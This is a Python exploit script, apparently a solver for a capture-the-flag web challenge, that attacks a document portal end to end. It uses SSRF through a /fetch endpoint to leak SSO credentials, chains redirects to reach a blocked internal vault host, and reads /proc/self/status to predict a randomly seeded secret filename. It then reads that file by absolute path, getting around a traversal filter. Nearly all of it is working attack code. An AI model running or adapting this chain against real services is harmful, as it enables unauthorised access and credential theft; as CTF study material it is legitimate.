import urllib.request
import urllib.parse
import json
import re
import base64
import sys
import random
import hashlib
import time

# Configuration
BASE_URL = "http://document-portal.single-sign-off.chals.live"
PORTAL_PORT = 10000 # If running locally on port 10000

# For local testing overrides
if len(sys.argv) > 1:
    BASE_URL = sys.argv[1]

def fetch(url):
    print(f"[*] Fetching {url}")
    target = f"{BASE_URL}/fetch"
    try:
        data = json.dumps({"url": url}).encode('utf-8')
        req = urllib.request.Request(target, data=data, headers={'Content-Type': 'application/json'})
        with urllib.request.urlopen(req) as r:
            response_json = json.loads(r.read().decode('utf-8'))
            return response_json
    except Exception as e:
        print(f"[-] Error parsing response or connecting: {e}")
        return None

def get_credentials():
    print("Step 1: Leaking Credentials via nite-sso .netrc...")
    # This remains the most reliable way to get the shared credentials
    data = fetch("http://nite-sso")
    
    if not data or not data.get('success'):
        print("[-] Failed to fetch nite-sso")
        return None, None

    response = data.get('response', '')
    match = re.search(r'Authorization: Basic ([a-zA-Z0-9+/=]+)', response)
    if match:
        b64_creds = match.group(1)
        decoded = base64.b64decode(b64_creds).decode('utf-8')
        username, password = decoded.split(':', 1)
        print(f"[+] Found credentials: {username} : {password}")
        return username, password
    else:
        print("[-] Authorization header not found")
        return None, None

def construct_redirect_chain(target_url, username, password):
    # Construct a chain of redirects using nite-sso /doLogin
    # We need to trigger CURLE_TOO_MANY_REDIRECTS (Limit is 5)
    # So we need 6 hops. 
    # Hop 0 (Initial) -> R1 -> R2 -> R3 -> R4 -> R5 -> Target
    # fetcher.c sets CURLOPT_MAXREDIRS = 5
    
    # We build it backwards
    current_url = target_url
    
    # We need 5 intermediate redirects
    for i in range(5):
        # nite-sso redirect mechanism: /doLogin?username=...&password=...&redirect_url=...
        # We need to encode the current_url as the redirect_url parameter
        encoded_target = urllib.parse.quote(current_url)
        current_url = f"http://nite-sso/doLogin?username={username}&password={password}&redirect_url={encoded_target}"
    
    return current_url

def get_pid_uid_gid(username, password):
    print("Step 2: Accessing /proc/self/status via Redirect Chain...")
    
    # Target: nite-vault/view to read /proc/self/status
    # We use nite-vault:80 (implicitly)
    # Use standard hostname 'nite-vault' which is blocked, but valid in redirect bypass
    target_file = "/proc/self/status"
    vault_url = f"http://nite-vault/view?file={target_file}&username={username}&password={password}"
    
    exploit_url = construct_redirect_chain(vault_url, username, password)
    
    data = fetch(exploit_url)
    if not data or not data.get('success'):
        print("[-] Failed to fetch status")
        if data: print(data)
        return None, None, None

    content = data.get('response', '')
    
    # Parse status
    pid = None
    uid = None
    gid = None
    
    # Note: /proc/self/status in the *context of the process reading it*.
    # nite-vault is a Flask app served by Gunicorn?
    # Or is it the worker process?
    # We need the PID used to generate the seed.
    # The file generation happens in generate_filename() in app.py
    # os.getpid() returns the current process ID.
    # When we read /proc/self/status via /view, we are reading the status of the process handling the request.
    # Assuming the same worker process handled the start-up (unlikely for gunicorn workers?)
    # Wait, 'name = generate_filename()' is called at MODULE LEVEL in app.py!
    # "name = generate_filename()" -> line 25 of app.py
    # This runs when the module is imported/app starts.
    # So it is the PID of the process that *loaded* the app.
    # In Gunicorn, the app is loaded by the worker? Or the master?
    # Usually Gunicorn loads code in workers (preload_app=False by default).
    # If workers fork, they inherit memory but have different PIDs.
    # BUT generate_filename is called *globally*.
    # If Gunicorn is used, 'app' object is created.
    # If preloading is off, each worker imports app and runs it?
    # Let's check start.sh: "gunicorn --bind unix:/tmp/nite-vault.sock app:app"
    # It doesn't specify workers. Default is 1 sync worker.
    # So there is likely 1 worker + master.
    # The 'app.py' code runs inside the worker process when it initializes the app?
    # Yes.
    # So if we get the PID of the worker handling our request, it *should* be the same PID that ran the initialization code (unless the worker forked *after* init? No, gunicorn forks then loads app usually).
    
    # Let's extract PID, Uid, Gid
    for line in content.split('\n'):
        if line.startswith('Pid:'):
            pid = int(line.split()[1])
        if line.startswith('Uid:'):
            # Uid: Real, Effective, Saved, FS
            uid = int(line.split()[1])
        if line.startswith('Gid:'):
            gid = int(line.split()[1])
            
    print(f"[+] Retrieved Process Info - PID: {pid}, UID: {uid}, GID: {gid}")
    return pid, uid, gid

def predict_filename(pid, uid, gid):
    print(f"Step 3: predicting filename from seed {pid}{uid}{gid}")
    seed_str = f"{pid}{uid}{gid}"
    seed = int(seed_str)
    
    # Replicate logic
    random.seed(seed)
    random_num = random.randint(100000, 999999)
    hash_part = hashlib.sha256(str(random_num).encode()).hexdigest()[:16]
    filename = f"{hash_part}.txt"
    print(f"[+] Predicted Filename: {filename}")
    return filename

def get_flag(filename, username, password):
    print("Step 4: Fetching Flag...")
    # Path: /app/nite-vault/secrets/{filename}
    # But /view joins PUBLIC_DIR = '/app/nite-vault/files' with filename.
    # We need to traverse?
    # app.py: 
    # if '../' in filename or '..\\'in filename: return 'Path traversal detected', 403
    # if not filename.startswith('/'): file_path = os.path.join(PUBLIC_DIR, filename)
    # else: file_path = filename
    # 
    # So if we provide an ABSOLUTE path, it uses it directly!
    # "if not filename.startswith('/'):" -> join
    # "else: file_path = filename"
    # So we can just pass "/app/nite-vault/secrets/{filename}"
    
    target_path = f"/app/nite-vault/secrets/{filename}"
    vault_url = f"http://nite-vault/view?file={target_path}&username={username}&password={password}"
    exploit_url = construct_redirect_chain(vault_url, username, password)
    
    data = fetch(exploit_url)
    if not data or not data.get('success'):
        print("[-] Failed to fetch flag file")
        if data: print(data)
        return

    content = data.get('response', '')
    print(f"[+] CONTENT:\n{content}")

if __name__ == "__main__":
    user, password = get_credentials()
    if user and password:
        # Since we might be running this multiple times or against multiple workers, 
        # PID might vary if there are multiple workers, but default is 1.
        # However, generate_filename is called once on startup.
        pid, uid, gid = get_pid_uid_gid(user, password)
        if pid:
            filename = predict_filename(pid, uid, gid)
            get_flag(filename, user, password)
